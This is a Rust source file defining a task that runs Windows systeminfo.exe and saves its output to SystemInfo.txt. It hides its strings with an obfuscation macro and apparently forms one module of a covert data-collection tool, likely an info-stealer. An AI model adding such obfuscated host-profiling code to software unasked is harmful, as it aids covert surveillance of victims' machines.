use alloc::string::String;
use tasks::Task;
use utils::path::{Path, WriteToFile};
use utils::process;
use obfstr::obfstr as s;
pub(super) struct SystemInfoTask;

impl Task for SystemInfoTask {
    unsafe fn run(&self, parent: &Path) {
        let system = Path::system();
        
        let res = process::run_file(&(&system / s!("systeminfo.exe")));
        if res.is_err() {
            return;
        }
        
        let res = res.unwrap();
        let res = String::from_utf8_lossy(&res);
        let res = res.trim();
        
        let output_path = parent / s!("SystemInfo.txt");
        let _ = res.write_to(&output_path);
    }
}